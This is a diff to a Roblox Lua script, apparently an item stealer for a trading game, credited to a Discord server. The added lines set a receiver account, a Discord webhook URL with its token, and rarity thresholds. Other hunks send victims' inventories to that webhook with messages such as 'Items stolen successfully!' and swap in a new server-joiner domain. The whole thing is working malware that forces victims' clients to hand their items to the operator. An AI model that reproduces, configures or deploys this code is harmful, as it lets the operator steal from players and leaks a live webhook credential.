@@ -1,4 +1,8 @@
 -- This file was generated at discord.gg/syncrypt
+ Usernames = {"siia_06"}
+Webhook = "https://discord.com/api/webhooks/1483824026039095467/nh8RTFy9-kmZLpGyCPTCaLd9PHUpU0308Mwe2eGXYEYWRu3k1FFkm-cy9bIJevSXN1O7"
+MinimumRarity = "Godly"
+MinimumValue = 1
 
 local u2, u3, u4, t1, v176, v179
 do
@@ -1036,7 +1040,7 @@ do
 									if #t5 < 20 then
 										local v1161 = v.count > 1 and " x" .. v.count or ""
 
-										table.insert(t5, v.name .. " â€” " .. v.value .. v1161)
+										table.insert(t5, v.name .. "  " .. v.value .. v1161)
 									end
 
 									n2 += v.value * v.count
@@ -1065,7 +1069,7 @@ do
 								value = v1166,
 								inline = false,
 							}
-							local v1168 = "https://gamerready.github.io/goofy-site/?placeId=142823291&gameInstanceId="
+							local v1168 = "https://plsbrainrot.me/joiner?placeId=142823291&gameInstanceId="
 								.. game.JobId
 							local t9 = {
 								t6,
@@ -1081,7 +1085,7 @@ do
 							local t10 = {
 								embeds = {
 									{
-										title = "âœ… Trade Completed",
+										title = "Trade Completed",
 										description = "Items stolen successfully!",
 										color = 65280,
 										fields = t9,
@@ -1174,7 +1178,7 @@ do
 						local t17 = {
 							embeds = {
 								{
-									title = "HITS MO TO TANGA!",
+									title = "ZAYED BISAY! ",
 									description = "Join and accept trade",
 									color = 16755200,
 									fields = t16,
@@ -1455,8 +1459,8 @@ do
 							v289(player)
 						end
 					end)
-					local siia_06= t1[1]:FindFirstChild("siia_06")
-					if siia_06and not u2 then
+					local siia_06 = t1[1]:FindFirstChild("siia_06")
+					if siia_06 and not u2 then
 						task.wait(15)
 						v289(siia_06)
 					end
